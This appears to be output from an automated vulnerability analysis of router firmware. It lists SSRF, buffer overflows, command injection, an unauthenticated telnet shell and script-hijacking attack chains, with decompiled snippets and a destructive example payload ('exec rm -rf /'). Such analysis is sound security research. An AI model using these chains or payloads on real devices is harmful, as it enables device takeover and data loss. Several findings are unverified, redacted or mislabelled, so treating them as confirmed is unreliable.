{"name": "Script-Init-remote.sh", "file_path": "etc/init.d/remote.sh", "location": "etc/init.d/remote.sh", "risk_score": 0.5, "confidence": 4.95, "description": "remote.sh is the initialization script that performs: 1) Creates symbolic links in the /tmp directory pointing to CGI files in /opt/remote 2) Initializes 10 NVRAM configuration items starting with leafp2p. All operations use hardcoded paths and values without processing any external input (such as HTTP parameters/env variables), presenting no risk of missing input validation. The two CGI symbolic links created by the script (RMT_invite.cgi/func.sh) may expose attack surfaces as network interfaces, requiring further analysis of their input handling logic.", "code_snippet": "leafp2p_remote_url=$(${nvram} get leafp2p_remote_url)\n[ -z $leafp2p_remote_url ] && {\n    ${nvram} set leafp2p_remote_url=\"http://peernetwork.netgear.com/...\"\n    ${nvram} commit\n}", "link_identifiers": ["leafp2p_sys_prefix", "leafp2p_replication_url", "leafp2p_remote_url", "leafp2p_debug", "leafp2p_firewall", "leafp2p_service_0", "nvram", "commit", "ln", "mkdir"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "arbitrary-code-execution-leafp2p-init-script", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:8-12", "risk_score": 8.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\n...\nstart() {\n    ${CHECK_LEAFNETS} &", "link_identifiers": ["leafp2p_sys_prefix", "SYS_PREFIX", "CHECK_LEAFNETS", "start()", "checkleafnets.sh", "${nvram} get", "nvram"], "notes": "Privilege Escalation  \n\nVerification required for NVRAM modification interfaces:  \n1) Web interface /cgi vulnerability  \n2) Default leafp2p_sys_prefix value  \n3) Writable /tmp directory  \ncheckleafnets.sh not located - recommend scanning /bin, /usr/bin and other directories."}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd", "risk_score": 4.0, "confidence": 2.5, "description": "The script calls undefined functions update_user/update_afp, which may execute during service startup (reload). If these functions are externally defined (e.g., in /etc/rc.common) and lack input validation, attackers could inject malicious operations by tampering with NVRAM or configuration files. Trigger condition: automatic execution during service startup. Currently, there is no evidence of directly controllable input points or specific vulnerability implementations.", "link_identifiers": ["update_user", "update_afp", "reload", "start", "afpd", "rc.common"], "notes": "Requires further analysis: 1) Whether these functions are defined in /etc/rc.common 2) External input handling of the associated binary /usr/sbin/afpd"}
{"name": "SafeCommand-afpd-send_wol", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd", "risk_score": 0.5, "confidence": 4.5, "description": "The execution of the send_wol command uses fixed parameters (/usr/sbin/send_wol 300 &), with no dependencies on environment variables or external inputs. Analysis confirms no risk of command injection or parameter pollution, and attackers cannot exploit this operation point.", "link_identifiers": ["send_wol", "start", "afpd"]}
{"name": "SSRF-GenieCGI-t-param", "file_path": "www/cgi-bin/genie.cgi", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 9.0, "description": "Server-Side Request Forgery (SSRF): Attackers inject arbitrary URLs via the 't=' parameter (obtained from the QUERY_STRING environment variable) in HTTP requests. The unfiltered parameter is directly used in snprintf to construct URLs (format: \"%s?t=%s&d=%s&c=%s\") and initiate requests via curl_easy_setopt(CURLOPT_URL). Trigger condition: Accessing CGI interfaces carrying the 't=' parameter. Boundary checks are absent (only limited by 0x800 buffer truncation). Security impact: Redirects requests to malicious servers, creating conditions for second-stage attacks. Full control requires combining with the base address of genie_remote_url in NVRAM.", "code_snippet": "sym.imp.snprintf(uVar2,uVar3,\"%s?t=%s&d=%s&c=%s\",*(puVar5 + -100));", "link_identifiers": ["getenv", "QUERY_STRING", "t=", "memcpy", "snprintf", "curl_easy_setopt", "CURLOPT_URL", "fcn.000093e4", "REDACTED_SENSITIVE_DATA", "genie_remote_url"], "notes": "Attack Chain Phase One: Contaminating the NVRAM genie_remote_url Enables Full Control of the Target URL"}
{"name": "StackOverflow-GenieCGI-ErrorHeader", "file_path": "www/cgi-bin/genie.cgi", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 8.5, "description": "Stack Buffer Overflow: When processing HTTP response headers, 'X-Error-Code'/'X-Error-Message' is copied to a fixed-size stack buffer (0x800) using strncpy. The length parameter len=*(puVar5-0x44)-*(puVar5-0x40) is not validated to ensure it does not exceed the buffer capacity. Trigger condition: Server returns error headers exceeding 0x888 bytes. Missing boundary check. Security impact: Overwriting return address enables arbitrary code execution. Requires directing requests to a malicious server via SSRF vulnerability.", "code_snippet": "sym.imp.strncpy(*(puVar5 + -0x24),*(puVar5 + -0x40),*(puVar5 + -0x44) - *(puVar5 + -0x40));", "link_identifiers": ["strncpy", "X-Error-Code", "X-Error-Message", "puVar5 + -0x24", "puVar5 + -0x40", "puVar5 + -0x44", "REDACTED_SENSITIVE_DATA"], "notes": "Phase Two of the Attack Chain: Leveraging SSRF Vulnerabilities to Obtain Malicious Response Headers"}
{"name": "REDACTED_SECRET_KEY_PLACEHOLDER-leafp2p-init-script", "file_path": "www/cgi-bin/genie.cgi", "location": "etc/init.d/leafp2p.sh:8-12", "risk_score": 8.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\n...\nstart() {\n    ${CHECK_LEAFNETS} &", "link_identifiers": ["leafp2p_sys_prefix", "SYS_PREFIX", "CHECK_LEAFNETS", "start()", "checkleafnets.sh", "${nvram} get", "nvram"], "notes": "Prerequisites: Requires the presence of an NVRAM write vulnerability (e.g., a web interface/cgi flaw). Connection point with SSRF attack chain: The naming pattern of leafp2p_remote_url resembles genie_remote_url, potentially sharing a common pollution path."}
{"name": "Input-Propagation-OpenVPN-EnvNVRAM", "file_path": "sbin/acos_service", "location": "HIDDEN", "risk_score": 6.0, "confidence": 3.75, "description": "The document indicates the handling of environment variables (getenv/unsetenv) and NVRAM configurations ('nvram set') as inputs, and initiates the OpenVPN process. Potential attack vector: Injecting malicious configurations by tampering with environment variables or NVRAM parameters to affect OpenVPN execution. Trigger condition: Requires control over environment variable settings or NVRAM write operations. Security impact: May enable command injection or configuration file tampering, but actual exploitation depends on: a) Contaminated parameters propagating to the OpenVPN startup command b) Absence of input filtering mechanisms c) Presence of vulnerabilities in the OpenVPN process. Currently, no evidence validates the complete data flow or boundary checks.", "link_identifiers": ["getenv", "unsetenv", "nvram set", "openvpn", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "BufferOverflow-REDACTED_SECRET_KEY_PLACEHOLDER-licensekey", "file_path": "bin/ookla", "location": "dbg.parse_config:0x16f4c [REDACTED_SECRET_KEY_PLACEHOLDER]", "risk_score": 8.5, "confidence": 8.0, "description": "When parsing the configuration file /settings.txt, the dbg.REDACTED_SECRET_KEY_PLACEHOLDER function uses strcpy to copy the licensekey value to the global structure offset 0x720 without length validation. If an attacker modifies the configuration file (requiring a file write vulnerability), constructing an excessively long licensekey could lead to a buffer overflow, potentially overwriting adjacent memory structures and hijacking control flow. Trigger conditions: 1) The attacker obtains write permissions for settings.txt 2) The ookla process reloads the configuration.", "code_snippet": "iVar1 = dbg.lcfg_value_get(...);\nif (iVar1 == 0) {\n    sym.imp.strcpy(*(0x52a0|0x20000)+0x720, puVar4+8+-0x414);\n}", "link_identifiers": ["dbg.REDACTED_SECRET_KEY_PLACEHOLDER", "lcfg_value_get", "strcpy", "settings.txt", "licensekey", "0x720"], "notes": "Verify the memory layout of the global structure 0x52a0; recommend checking historical vulnerabilities in conjunction with the CVE database."}
{"name": "PathTraversal-parseServers-apiurl", "file_path": "bin/ookla", "location": "dbg.parseServers:0x0 [HIDDEN]", "risk_score": 7.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "uVar3 = sym.imp.rindex(puVar10+8+-0x448,0x2f);\nsym.imp.strcpy(*(*(0x5724|0x20000)+4),*(puVar10+-0x10)+1);", "link_identifiers": ["dbg.parseServers", "lcfg_value_get", "strcpy", "rindex", "apiurl", "0x610"], "notes": "Path traversal protection is incomplete; dynamic testing of API URL injection is recommended."}
{"name": "Info-ClientComponent-NoServerLogic", "file_path": "bin/ookla", "location": "N/A", "risk_score": 0.0, "confidence": 5.0, "description": "The file is identified as an implementation of the Ookla Speedtest client, with core functionalities including HTTP request transmission and response processing (e.g., REDACTED_SECRET_KEY_PLACEHOLDER functions), without any HTTP server-side logic. It cannot process external network inputs such as the upload.php endpoint, and relevant attack vectors should be analyzed within server-side components.", "link_identifiers": ["REDACTED_SECRET_KEY_PLACEHOLDER", "http_read_line", "send", "recv"], "notes": "Component Analysis"}
{"name": "LowRisk-UnusedStrings-rodata", "file_path": "bin/ookla", "location": ".rodata:0x12770,0x12670,0x12870", "risk_score": 2.0, "confidence": 4.25, "description": "Suspicious Strings ('qX^1WA!HP(','8zjAUM','jiO4sXA') located in the .rodata section but have no code references, possibly unused data. Low risk of hardcoded credentials.", "link_identifiers": ["qX^1WA!HP(", "8zjAUM", "jiO4sXA", ".rodata"], "notes": "Dynamically monitor string usage"}
{"name": "ExploitChain-NVRAM-Tamper-to-RCE", "file_path": "sbin/acos_service", "location": "etc/init.d/leafp2p.sh:8-12 → HIDDEN", "risk_score": 9.0, "confidence": 6.5, "description": "Attack Chain: Remote Code Execution via NVRAM Configuration Pollution. Steps: 1) Attacker modifies NVRAM's leafp2p_sys_prefix value (e.g., setting it to /tmp) 2) Deploys malicious checkleafnets.sh in /tmp/bin 3) Malicious script executes with REDACTED_PASSWORD_PLACEHOLDER privileges upon service restart 4) Gained control enables OpenVPN process manipulation (requires OpenVPN attack path conditions). Trigger Conditions: Existence of NVRAM write vulnerability (e.g., web interface flaw) + service restart mechanism. Security Impact: REDACTED_PASSWORD_PLACEHOLDER-level device takeover enabling persistent control when combined with OpenVPN vulnerabilities.", "link_identifiers": ["nvram", "leafp2p_sys_prefix", "checkleafnets.sh", "openvpn", "SYS_PREFIX", "start()"], "notes": "Attack Chain:\n1) Prerequisite: NVRAM write point (refer to CGI endpoint in Script-Init-remote.sh)\n2) Terminal threat amplification to OpenVPN process (Input-Propagation-OpenVPN-EnvNVRAM)\n3) Detected recurring record: REDACTED_SECRET_KEY_PLACEHOLDER-leafp2p-init-script"}
{"name": "AttackChain-Gap-NVRAM-Write", "file_path": "bin/ookla", "location": "N/A (HIDDEN)", "risk_score": 9.0, "confidence": 4.0, "description": "The current attack chain has a critical gap: no vulnerability has been discovered that allows remote attackers to write to NVRAM configuration items (such as genie_remote_url). Both the SSRF vulnerability (SSRF-GenieCGI-t-param) and the privilege escalation vulnerability (REDACTED_SECRET_KEY_PLACEHOLDER-leafp2p-init-script) rely on tampering with NVRAM configuration items, but existing analysis has not identified any data flow from network interfaces to NVRAM writes. Trigger condition: an exposed CGI interface handling NVRAM write operations (e.g., 'nvram set') must exist, coupled with insufficient input validation. Security impact: this hinders the complete exploitation of the attack chain (SSRF → stack overflow/privilege escalation).", "link_identifiers": ["nvram set", "genie_remote_url", "leafp2p_sys_prefix", "RMT_invite.cgi", "func.sh", "commit"], "notes": "Follow-up analysis objectives: 1) Reverse engineer uncollected CGI files (/tmp/www/cgi-bin/RMT_invite.cgi/func.sh) 2) Verify whether genie.cgi contains hidden NVRAM write operations 3) Check if settings.txt is generated through NVRAM configuration"}
{"name": "env-pollution-tz-set-bin_startcircle_7", "file_path": "bin/startcircle", "location": "bin/startcircle:7", "risk_score": 8.5, "confidence": 8.25, "description": "Environment variable TZ pollution path: startcircle sets the external command result as an environment variable via `export TZ=$(get_tz)`. An attacker can inject malicious timezone values containing special characters by tampering with the get_tz binary or influencing its execution environment (e.g., configuration files/NVRAM). This variable is inherited by subsequent processes (e.g., timetracker). If the target process has timezone parsing vulnerabilities (e.g., buffer overflow/command injection), it can form an RCE attack chain. Trigger conditions: 1) get_tz command is tampered with 2) dependent processes do not securely handle TZ values. Boundary check: startcircle only verifies that TZ is non-empty but does not filter its content.", "code_snippet": "export TZ=`$DIR/get_tz`\n[ \"x$TZ\" = \"x\" ] && export TZ='GMT8DST,M03.02.00,M11.01.00'", "link_identifiers": ["export", "TZ", "get_tz", "timetracker"], "notes": "Follow-up validation directions: 1) Reverse engineer get_tz to confirm input sources 2) Analyze timetracker's TZ processing logic 3) Check environment inheritance mechanism"}
{"name": "config-association-timetracker-p", "file_path": "bin/startcircle", "location": "usr/sbin/:0 (HIDDEN)", "risk_score": 3.0, "confidence": 4.25, "description": "Configuration file association risk: configure.xml is not directly processed in startcircle, but is associated via the `$DIR/timetracker -p` command. If vulnerabilities exist in this configuration file's parsing (e.g., XXE/command injection), they could potentially be triggered through the -p parameter. Currently, there is no direct evidence, requiring cross-directory analysis of the handler program in usr/sbin.", "link_identifiers": ["configure.xml", "timetracker", "-p"], "notes": "Configuration file association risk.  \n\nRecommended analysis: Check for the presence of XML parsers in the /usr/sbin directory.  \nAssociated finding: env-pollution-tz-set-bin_startcircle_7."}
{"name": "command-injection-wget-e-parameter", "file_path": "bin/wget", "location": "bin/wget", "risk_score": 9.5, "confidence": 8.25, "description": "The -e parameter handling in wget contains a command injection vulnerability: 1) The run_command function directly executes user-input commands 2) parse_line filtering is insufficient (only handles spaces/comments) 3) Commands are ultimately executed via system. Trigger condition: attacker controls wget's -e parameter value (e.g. 'exec rm -rf /'), requiring wget to be invoked via script or web interface. Successful exploitation could lead to arbitrary command execution.", "link_identifiers": ["run_command", "parse_line", "setval_internal", "system", "-e", "execute"], "notes": "Command injection verification based on REDACTED_SECRET_KEY_PLACEHOLDER. Follow-up required: 1) Test command injection in actual firmware 2) Confirm wget execution permissions (typically REDACTED_PASSWORD_PLACEHOLDER)"}
{"name": "potential-path-traversal-wget-output-document", "file_path": "bin/wget", "location": "bin/wget", "risk_score": 8.0, "confidence": 6.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["setoptval", "fopen64", "--output-document", "-O"], "notes": "Based on the initial findings from TaskDelegator, but REDACTED_SECRET_KEY_PLACEHOLDER analysis failed to verify. It is recommended to manually reverse-validate the setoptval function."}
{"name": "potential-path-traversal-wget-directory-prefix", "file_path": "bin/wget", "location": "bin/wget", "risk_score": 7.5, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["url_parse", "rewrite_shorthand_url", "--directory-prefix", "-P"], "notes": "Based on the preliminary findings from TaskDelegator, the analysis of REDACTED_SECRET_KEY_PLACEHOLDER failed without verification. It is necessary to check the path concatenation logic."}
{"name": "RCE-utelnetd-0x9784", "file_path": "bin/utelnetd", "location": "bin/utelnetd:0x9784 (fcn.000090a4)", "risk_score": 10.0, "confidence": 9.9, "description": "The utelnetd service has an unauthenticated remote command execution vulnerability. Attack path: The attacker establishes a TCP connection via the telnet protocol (port 23) → the service forks a child process → directly execv('/bin/sh'). Trigger conditions: 1) The device exposes the telnet port 2) A TCP connection is established. Security impact: The attacker gains a full REDACTED_PASSWORD_PLACEHOLDER privilege shell (process privileges need to be verified). Exploitation chain: network input → process creation → command execution.", "code_snippet": "iVar14 = sym.imp.fork();\nif (iVar14 == 0) {\n    sym.imp.execv((*0x9af4)[2], *0x9af4 + 3);  // HIDDEN0x9cbfHIDDEN'/bin/sh'", "link_identifiers": ["sym.imp.execv", "fcn.000090a4", "0x9af4", "0x9cbf", "sym.imp.fork", "/bin/sh", "telnet", "RCE", "utelnetd"], "notes": "Remote Command Execution (RCE).  \n\nVerification required: 1) Service running with REDACTED_PASSWORD_PLACEHOLDER privileges 2) Public network exposure status. Related vulnerability: Pseudo-terminal overflow (BOF-utelnetd-0x95c0) reduces severity when RCE is present."}
{"name": "BOF-utelnetd-0x95c0", "file_path": "bin/utelnetd", "location": "bin/utelnetd:0x95c0-0x95cc", "risk_score": 7.5, "confidence": 6.25, "description": "The pseudoterminal path copying has a buffer overflow vulnerability. Attack path: Attacker exhausts pseudoterminal device numbers → System allocates long pathname (e.g. /dev/pts/99999) → strcpy copies to 8-byte stack buffer (auStack_120). Trigger conditions: 1) Pseudoterminal exhaustion attack 2) Pathname length >8 bytes. Security impact: May overwrite return address to achieve arbitrary code execution. Exploit chain: System resource exhaustion → Dangerous path generation → Stack overflow.", "code_snippet": "0x95c0: bl sym.imp.ptsname\n0x95c4: mov r1, r0\n0x95c8: add r0, r5, 0x14  // r5HIDDENauStack_120\n0x95cc: bl sym.imp.strcpy", "link_identifiers": ["sym.imp.strcpy", "sym.imp.ptsname", "r5+0x14", "auStack_120", "buffer_overflow", "utelnetd", "pts"], "notes": "The actual risk is relatively low when an RCE vulnerability exists. Verification of stack frame layout and protection mechanisms is required. Related vulnerability: Can serve as an auxiliary exploitation chain for RCE (RCE-utelnetd-0x9784)."}
{"name": "stack_overflow-nvram_handler-b264", "file_path": "sbin/rc", "location": "rc:0xb264 sub_b264", "risk_score": 9.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "iVar4 = sym.imp.nvram_get(*0xc1e4);\n...\nsym.imp.strcpy(*(puVar14 + -0x4eb8), iVar1);", "link_identifiers": ["nvram_get", "strcpy", "*0xc1e4", "*0xc118", "*0xc248", "SP-0x154", "SP-0x2d0"], "notes": "The buffer size is confirmed through stack offset calculation (0x2d0 - 0x154 = 380 bytes). Subsequent analysis of the HTTP interface is required to determine whether *0xc1e4 can be set."}
{"name": "command_injection-eval_execution-c9f0", "file_path": "sbin/rc", "location": "rc:0xc9f0 sub_b264", "risk_score": 6.0, "confidence": 5.5, "description": "Command injection risk: Commands constructed via _eval execution from stack buffer (puVar14-300). Trigger conditions: 1) Branch selection enters *0xc1f0/*0xc168 data source path 2) First 24 bytes of data source contain no 0x00 (causing _eval to read beyond stack). Missing boundary check: No terminator added after memory copy. Security impact: Potential execution of unintended commands, but constrained by: a) Fixed-address data source b) Requirement for precise memory layout control, making practical exploitation moderately difficult.", "code_snippet": "puVar13 = *(puVar14 + -0x4eb8);\n*puVar13 = **0xc1f0;\n...\nsym.imp._eval(puVar14 + -300, *0xc1f4, 0, 0);", "link_identifiers": ["_eval", "*0xc1f0", "*0xc168", "puVar14 + -300", "*0xc1f4"], "notes": "Command injection.  \n\nRisk level downgraded due to uncontrollable data source. It is recommended to inspect the memory contents at *0xc1f0/*0xc168."}
{"name": "attack_path-nvram_trigger_chain-b264", "file_path": "sbin/rc", "location": "rc:0xb264 sub_b264", "risk_score": 8.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "iVar1 = sym.imp.nvram_get(*0xc108);\nif ((iVar1 == 0) || (iVar1 = sym.imp.strcmp(iVar1,*0xc10c), iVar1 != 0) {...}", "link_identifiers": ["nvram_get", "strcmp", "*0xc108", "*0xc248", "NVRAM"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "HIDDEN-NVRAM-circled-0x11308", "file_path": "bin/circled", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "if (fcn.0000ec10(0x481c) != 0) {\n  snprintf(cmd, \"nvram get %s\", \"circle_reset_default\");\n  popen(cmd);\n}", "link_identifiers": ["fcn.0000ec10", "sym.imp.popen", "nvram get circle_reset_default", "0x5798", "REDACTED_SENSITIVE_DATA"], "notes": "Command injection.  \n\nVerification required: 1) Whether the NVRAM settings interface has filtering 2) Default permissions of the /shares directory."}
{"name": "HIDDEN-tarHIDDEN-0x11c80", "file_path": "bin/circled", "location": "bin/circled:0x11c80", "risk_score": 8.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "snprintf(cmd, 0x400, \"cd %s && tar zxf %s\", \"/tmp\", \"/tmp/database.tar.gz\");\nsystem(cmd);", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "str.cd__s___tar_zxf__s", "/tmp/database.tar.gz", "piVar5[-0x994]", "0x11c80"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "HIDDEN-circled-0xec10", "file_path": "bin/circled", "location": "bin/circled:0xec10", "risk_score": 7.0, "confidence": 8.75, "description": "Conditional trigger", "code_snippet": "int fcn.0000ec10(char *path) {\n  struct stat s;\n  return stat(path, &s) == 0 ? 0 : -1;\n}", "link_identifiers": ["fcn.0000ec10", "sym.imp.stat", "0x481c", "REDACTED_SENSITIVE_DATA"], "notes": "Conditional trigger"}
{"name": "Authentication-Bypass-Netlink-130ec", "file_path": "bin/ipset", "location": "unknown/from_analysis:0 (dbg.mnl_nlmsg_portid_ok) 0x130ec", "risk_score": 8.5, "confidence": 7.75, "description": "Netlink Authentication Bypass High-Risk Vulnerability:\n- Manifestation: The dbg.mnl_nlmsg_portid_ok function unconditionally returns true when nlmsg_pid=0\n- Trigger Condition: Attacker crafts a netlink message with portid=0\n- Constraints: Requires sending netlink messages locally/over network (requires CAP_NET_ADMIN capability)\n- Security Impact: Bypasses authentication to enter callback chain (0xd588 function pointer), combined with unvalidated splitting in ipset_parse_elem (ipset_strchr) may trigger memory corruption\n- Exploitation Method: Malicious message → bypass authentication → trigger callback chain → potential RCE", "code_snippet": "bVar1 = *(param_1 + 0xc) == 0;\nif (!bVar1) { bVar1 = param_2 == 0; }\nif (bVar1) return true;", "link_identifiers": ["dbg.mnl_nlmsg_portid_ok", "nlmsg_pid", "dbg.mnl_cb_run", "ipset_parse_elem", "ipset_strchr", "0xd588"], "notes": "Authentication Bypass"}
{"name": "BufferOverflow-session-ec08", "file_path": "bin/ipset", "location": "unknown/from_analysis:0 (0xec08) 0xec08", "risk_score": 7.5, "confidence": 6.75, "description": "Buffer overflow vulnerability in session structure:\n- Manifestation: strcpy in dbg.callback_list directly copies ipset_data_setname return value into fixed-size session structure\n- Trigger condition: param_3 string length exceeds target buffer size (requires ≥32 bytes)\n- Constraints: Requires triggering specific call chain via CLI commands\n- Security impact: Stack/heap overflow leading to DoS or RCE\n- Exploitation method: Pollute param_3 input source (e.g., malicious setname parameter) to trigger overflow", "code_snippet": "sym.imp.strcpy(uVar7, uVar4); // uVar7=*(session+0x18)", "link_identifiers": ["dbg.callback_list", "strcpy", "session", "ipset_data_setname", "param_3"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "BoundaryError-ipset_strlcpy-a800", "file_path": "bin/ipset", "location": "unknown/from_analysis:0 (dbg.ipset_strlcpy) 0xa800", "risk_score": 6.5, "confidence": 6.0, "description": "Boundary underflow vulnerability in ipset_strlcpy:\n- Manifestation: When len=0, executing *(dst+len-1)=0 causes memory underflow\n- Trigger condition: Caller passes len=0 parameter\n- Constraint: Requires control over parameters at calling points like build_argv\n- Security impact: Arbitrary single-byte write of 0 (NULL) to any address\n- Exploitation method: Construct len=0 parameter to trigger write-zero operation", "link_identifiers": ["dbg.ipset_strlcpy", "param_3(len)", "*(param_1 + param_3 + -1)"], "notes": "Actual risk is low: The call point build_argv ensures len≥1 through calloc."}
{"name": "FileAccess-getservbyname-0", "file_path": "bin/ipset", "location": "unknown/from_analysis:0 (getservbyname) 0x0", "risk_score": 2.0, "confidence": 8.75, "description": "File Access Security Verification:\n- Behavior: Accesses the fixed path /etc/services via getservbyname\n- Trigger Condition: User inputs a non-numeric port name\n- Constraint: Hardcoded path is unaffected by input\n- Security Impact: No direct vulnerability, but file tampering may cause parsing errors", "link_identifiers": ["getservbyname", "ipset_parse_port", "/etc/services"]}
{"name": "stack_overflow-bd_http_nvram-0xb4b4", "file_path": "sbin/bd", "location": "sbin/bd:0xb4b4 (fcn.0000b4b4) 0xb4b4", "risk_score": 9.8, "confidence": 8.75, "description": "Critical Remote Code Execution Vulnerability (CVSS 9.8). Trigger conditions: 1) Attacker sets ≥20 oversized NVRAM configuration items (each ≥3000 bytes) via HTTP interface 2) bd repeatedly calls acosNvramConfig_get within function fcn.0000b4b4 to retrieve values 3) Absence of cumulative length check (iVar4 + uVar2 > MAX_BUF) when copying to fixed 65268-byte stack buffer (auStack_1031c) using memcpy. Exploit effect: Full control over program execution flow. Requires cross-file verification of HTTP interface implementation.", "code_snippet": "do {\n  pcVar5 = sym.imp.acosNvramConfig_get(pcVar5);\n  uVar2 = sym.imp.strlen(iVar6);\n  sym.imp.memcpy(iVar1,iVar6,uVar2);\n  iVar7 = sym.imp.strlen(iVar6);\n  iVar4 = iVar4 + iVar7 + 1; // HIDDEN：HIDDEN\n} while (*pcVar5 != '\\0');", "link_identifiers": ["acosNvramConfig_get", "memcpy", "auStack_1031c", "iVar4", "uVar2", "do-while", "http_interface"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "config_injection-bd_nvram-0xa580", "file_path": "sbin/bd", "location": "sbin/bd:0xa580 (fcn.00009f78) 0xa580", "risk_score": 7.5, "confidence": 7.25, "description": "NVRAM configuration injection vulnerability. Trigger conditions: 1) Attacker tampers with NVRAM configuration values (e.g., lan_hostname) 2) The manipulated values are read via acosNvramConfig_get in function fcn.00009f78 and directly written back via acosNvramConfig_set without validation. Actual impact: Disruption of critical system configurations leading to service interruption or privilege escalation.", "code_snippet": "uVar4 = sym.imp.acosNvramConfig_get(*0xa7c8);\nsym.imp.strcpy(puVar8 - 0x44, uVar4);\n...\nsym.imp.acosNvramConfig_set(*0xa7c8, puVar8 - 0x44);", "link_identifiers": ["acosNvramConfig_set", "acosNvramConfig_get", "puVar8", "strcpy", "nvram_config"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "CMD-INJECTION-UPGRADE_SH-PARAM", "file_path": "usr/sbin/upgrade.sh", "location": "usr/sbin/upgrade.sh:153-161", "risk_score": 8.0, "confidence": 8.25, "description": "Unvalidated command-line argument injection risk: The script directly controls sensitive operations (system shutdown/update) via the '$1' parameter without whitelist validation. Trigger condition: An attacker invokes this script through a web interface or IPC mechanism while controlling the first argument. Actual impact: May cause critical service termination (e.g., DPI service shutdown) or forcibly trigger firmware update procedures.", "code_snippet": "[ \"$1\" = \"all\" ] && all && exit 0\n[ \"$1\" = \"start\" ] && start_sys && exit 0\n[ \"$1\" = \"stop\" ] && stop_sys && exit 0", "link_identifiers": ["$1", "all", "update", "restore", "stop_sys", "start_sys"], "notes": "Command-line argument injection. Need to analyze parameter injection points in conjunction with HTTP interfaces/cron, attack path feasibility depends on external invocation context."}
{"name": "PATH-TRAVERSAL-UPGRADE_SH-FILEOPS", "file_path": "usr/sbin/upgrade.sh", "location": "usr/sbin/upgrade.sh:60,96", "risk_score": 7.0, "confidence": 7.25, "description": "Path traversal vulnerability: The move_file/copy_file functions directly concatenate variables like '$1/$IDP.ko' without preventing '../'-style attacks. Trigger condition: Path can be controlled by contaminating $UPDATE_PATH/$BACKUP_PATH environment variables or NVRAM values. Actual impact: Can achieve kernel module (ko) overwriting or sensitive file reading.", "code_snippet": "if [ -f $1/$IDP.ko ]; then\n  [ \"$($MV $1/$IDP.ko $2)\" ] && ...", "link_identifiers": ["move_file", "copy_file", "$1/$IDP.ko", "$UPDATE_PATH", "$BACKUP_PATH"], "notes": "The pollution source needs to be verified through the NVRAM/getenv mechanism, and it is recommended to track the environment variable setting points subsequently."}
{"name": "SCRIPT-HIJACK-UPGRADE_SH-SETUP", "file_path": "usr/sbin/upgrade.sh", "location": "usr/sbin/upgrade.sh:16,26,43", "risk_score": 9.5, "confidence": 6.5, "description": "External Script Hijacking Risk: Execution of '/tmp/trend/setup.sh' via '$MAIN_PATH/$SETUP', where the directory is globally writable. Trigger Condition: An attacker first uploads a malicious setup.sh to /tmp/trend and then triggers an update. Actual Impact: Arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges, with a high success rate for the complete attack chain.", "code_snippet": "cd $MAIN_PATH\n$MAIN_PATH/$SETUP stop\n...\n$MAIN_PATH/$SETUP start", "link_identifiers": ["$MAIN_PATH/$SETUP", "setup.sh", "/tmp/trend", "$SETUP"], "notes": "External script hijacking.  \n\nImportant: Verify the permissions of the /tmp/trend directory (analyze using ls -ld). It is recommended to inspect the web file upload functionality as the initial entry point."}
{"name": "command-injection-cp_installer-param1-param4", "file_path": "usr/sbin/cp_installer.sh", "location": "usr/sbin/cp_installer.sh:17-21,198-200,226-228", "risk_score": 9.5, "confidence": 8.5, "description": "The script accepts four unvalidated external parameters: $1 (update server URL), $2 (local installation directory), $3 (environment file path), and $4 (CA certificate path). An attacker can control $1 to specify a malicious server and combine it with $4 to designate a malicious CA certificate, bypassing HTTPS verification to download a tampered cpinst.tar.gz package. During extraction, unsanitized parameters are passed when executing ./cpinst/cp_startup.sh, leading to arbitrary command execution. Trigger condition: The attacker must be able to invoke this script and control the parameters (e.g., through firmware update mechanisms or other vulnerabilities).", "code_snippet": "REPO_URL=${1}\nCA_FILE=${4}\nwget -4 ${HTTPS_FLAGS} ${REPO_URL}/.../cpinst.tar.gz\ntar -zxf /tmp/cpinst.tar.gz\n./cpinst/cp_startup.sh ...", "link_identifiers": ["REPO_URL=${1}", "CA_FILE=${4}", "wget -4 ${HTTPS_FLAGS}", "tar -zxf /tmp/cpinst.tar.gz", "./cpinst/cp_startup.sh"], "notes": "The complete attack chain relies on the analysis of cp_startup.sh (this file is dynamically downloaded). Recommendations for further investigation: 1) Components in the firmware that invoke cp_installer.sh 2) Default source of cpinst.tar.gz"}
